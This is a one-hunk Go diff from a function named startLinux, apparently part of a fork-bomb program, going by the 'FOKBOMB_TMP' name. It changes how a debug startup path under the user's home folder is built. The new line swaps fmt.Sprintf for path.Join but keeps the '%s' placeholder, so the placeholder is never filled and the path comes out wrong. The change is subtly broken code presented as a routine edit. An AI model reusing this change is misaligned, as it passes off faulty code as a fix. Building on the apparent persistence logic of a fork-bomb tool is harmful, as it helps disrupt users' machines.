@@ -233,7 +233,7 @@ func startLinux() (string, string) {
 
 	if DEBUG {
 		// Use this to verify it works
-		startup = fmt.Sprintf("/home/%s/FOKBOMB_TMP", user)
+		startup = path.Join("/home/%s/FOKBOMB_TMP", user)
 		verbose("rsgn", startup)
 	}
 
